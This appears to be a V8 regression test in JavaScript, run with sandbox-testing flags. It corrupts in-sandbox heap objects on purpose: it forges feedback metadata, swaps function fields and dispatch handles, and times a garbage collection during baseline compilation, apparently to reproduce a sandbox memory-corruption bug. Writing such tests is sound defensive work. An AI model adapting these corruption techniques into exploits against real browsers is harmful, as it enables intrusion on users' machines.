// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

const sbx = new DataView(new Sandbox.MemoryView(0, 0x100000000));

const kJSFunctionType = Sandbox.getInstanceTypeIdFor('JS_FUNCTION_TYPE');
const kDispatchHandleOffset =
    Sandbox.getFieldOffset(kJSFunctionType, 'dispatch_handle');
const kSharedFunctionInfoOffset =
    Sandbox.getFieldOffset(kJSFunctionType, 'shared_function_info');
const kFeedbackCellOffset =
    Sandbox.getFieldOffset(kJSFunctionType, 'feedback_cell');
const kFeedbackCellValueOffset = Sandbox.getFieldOffset(
    Sandbox.getInstanceTypeIdFor('FEEDBACK_CELL_TYPE'), 'value');
const kElementsOffset = Sandbox.getFieldOffset(
    Sandbox.getInstanceTypeIdFor('JS_ARRAY_TYPE'), 'elements');
const kFeedbackMetadataOffset = 16;

const params = Array.from({length: 0x4140}, (_, i) => 'a' + i).join(',');
// Give t1 a large enough bytecode body to exceed the Sparkplug batch budget
// after ~60 calls without crossing the Maglev tier-up threshold.
const body = 'let s = 0;' +
    's = (s + 1) | 0;'.repeat(600) + 'return function inner() { return s; };';
const mk1 = eval('(function() { return function t1(' + params + ') { ' + body + ' }; })');
const mk2 = eval(
    '(function() { return function t2(' + params + ') { return 43; }; })');

const uninitialized = sbx.getUint32(
    sbx.getUint32(Sandbox.getAddressOf(mk1()) + kFeedbackCellOffset, true) - 1 +
        kFeedbackCellValueOffset,
    true);

const f2 = mk2();
f2();

const f1 = mk1();
for (let i = 0; i < 60; i++) f1();

// Allow concurrent Sparkplug compilation to finish installing BaselineCode on
// t1's SharedFunctionInfo and build heap pressure so allocating the
// ClosureFeedbackCellArray inside Runtime_InstallBaselineCode triggers a GC.
const keep = [];
for (let i = 0; i < 80; i++) {
  keep.push(new Array(60000).fill(i));
}

// 30001 elements -> FixedArray::SizeFor(30001) == 120012 bytes ==
// FeedbackMetadata::SizeFor(0, 60000).
const bigArr = new Array(30001).fill(0);
const victim = mk1();
const victimAddr = Sandbox.getAddressOf(victim);

const f2Handle =
    sbx.getUint32(Sandbox.getAddressOf(f2) + kDispatchHandleOffset, true);
const victimCell = sbx.getUint32(victimAddr + kFeedbackCellOffset, true) - 1;
const victimSfi =
    sbx.getUint32(victimAddr + kSharedFunctionInfoOffset, true) - 1;
const meta = sbx.getUint32(victimSfi + kFeedbackMetadataOffset, true) - 1;
const elementsAddr =
    sbx.getUint32(Sandbox.getAddressOf(bigArr) + kElementsOffset, true) - 1;

sbx.setUint32(elementsAddr, sbx.getUint32(meta, true), true);
sbx.setUint32(elementsAddr + 4, 0, true);
sbx.setUint32(elementsAddr + 8, 60000, true);
for (let i = 3; i < 30003; i++) {
  sbx.setUint32(elementsAddr + i * 4, 0x00010001, true);
}

sbx.setUint32(victimSfi + kFeedbackMetadataOffset, elementsAddr + 1, true);
sbx.setUint32(victimCell + kFeedbackCellValueOffset, uninitialized, true);
sbx.setUint32(
    victimAddr + kDispatchHandleOffset, (f2Handle | 0x41) >>> 0, true);

victim();
